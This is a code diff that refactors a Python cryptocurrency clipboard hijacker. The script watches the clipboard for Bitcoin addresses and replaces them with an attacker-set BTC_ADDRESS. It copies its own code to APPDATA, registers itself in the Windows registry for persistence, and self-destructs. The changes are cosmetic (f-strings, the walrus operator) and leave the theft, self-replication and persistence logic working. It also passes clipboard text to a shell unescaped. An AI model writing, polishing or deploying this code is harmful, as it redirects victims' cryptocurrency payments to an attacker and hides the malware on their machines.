@@ -56,17 +56,16 @@ class Methods:
     @staticmethod
     def set_clipboard(text):
         logging.debug('Set clipboard')
-        return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)
+        return subprocess.check_call(f'echo {text.strip()} |clip', shell=True)
     
     def check(self, text):
         try:
-            regex_check = re.findall(self.regex, text)
-            if regex_check:
+            if regex_check := re.findall(self.regex, text):
                 return True
 
         except Exception as e:
             logging.debug(e)
-        
+
         return False
 
 def add_to_registry():
@@ -96,12 +95,10 @@ def replicate():
 
     with open(sys.argv[0], 'r', encoding='utf-8') as f:
         lines = f.readlines()
-        for line in lines:
-            virus_code.append(line)
-
+        virus_code.extend(iter(lines))
     path =  os.getenv('APPDATA') + '\\'
     hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0] #BACK
-    logging.debug('Hide path: %s '% hide_path)
+    logging.debug(f'Hide path: {hide_path} ')
 
     with open(hide_path, 'w', encoding='utf-8') as f:
         for line in virus_code:
@@ -124,14 +121,14 @@ def start():
         with Clipboard() as clipboard: 
             time.sleep(0.1)
             target_clipboard = clipboard
-            logging.debug('Text found in clipboard: %s' % target_clipboard) 
+            logging.debug(f'Text found in clipboard: {target_clipboard}') 
 
         if m.check(target_clipboard):
-            logging.debug('Probably a btc address.') 
-            logging.debug('Original clipboard: %s' % target_clipboard)
-            logging.debug('Setting clipboard to %s' % BTC_ADDRESS)
+            logging.debug('Probably a btc address.')
+            logging.debug(f'Original clipboard: {target_clipboard}')
+            logging.debug(f'Setting clipboard to {BTC_ADDRESS}')
             m.set_clipboard(BTC_ADDRESS)         
-        
+
         else:
             logging.debug('Not a btc address?')
 
@@ -144,10 +141,7 @@ def main():
         add_to_registry()
         self_destruct()
         hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0]
-        start()
-        
-    else:
-        start()
+    start()
 
 main()
 
